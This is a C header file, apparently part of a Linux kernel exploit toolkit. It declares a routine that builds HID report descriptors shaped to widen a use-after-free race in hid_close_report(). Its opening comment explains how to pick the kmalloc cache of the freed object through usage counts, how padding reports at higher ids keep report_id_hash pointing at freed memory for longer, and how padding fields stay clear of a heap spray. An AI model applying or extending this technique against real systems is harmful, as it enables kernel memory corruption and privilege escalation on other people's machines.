/* lib/trigger/hid_rdesc.h - report descriptors shaped for a free window.
 *
 * Two properties matter to an exploit that races hid_close_report():
 *
 *   - the size of the field allocation, which is
 *     sizeof(struct hid_field) + usages * (sizeof(struct hid_usage) + 12),
 *     so the number of usages per field selects the kmalloc cache the freed
 *     object comes from;
 *
 *   - how long the window stays open. hid_close_report() frees report ids in
 *     ascending order and only memsets report_enum once that loop is done, so
 *     report_id_hash[] keeps pointing at an already-freed report for the whole
 *     tail. Reports declared at ids ABOVE the target are therefore free work
 *     inside the window, and widen it.
 *
 * Padding fields carry two usages so they allocate from a different cache than
 * a single-usage target field, and do not compete with a spray aimed at it.
 */
#ifndef LIB_HID_RDESC_H
#define LIB_HID_RDESC_H

#include <stddef.h>

struct lib_hid_rdesc_spec {
	unsigned char report_id;    /* the target report */
	int fields;                 /* single-usage fields in it */
	unsigned char reply_id;     /* extra report to declare, 0 for none */
	int reply_count;            /* its report count */
	int pad_reports;            /* padding reports at ids above report_id */
	int pad_fields;             /* fields in each, two usages apiece */
};

/* Build the descriptor into `out`. Returns its length, or 0 if it does not
 * fit. `*pad_placed` receives how many padding reports were actually declared,
 * which is bounded by `cap` and by the 255 available ids. */
size_t lib_hid_rdesc_build(unsigned char *out, size_t cap,
			   const struct lib_hid_rdesc_spec *spec,
			   int *pad_placed);

#endif /* LIB_HID_RDESC_H */
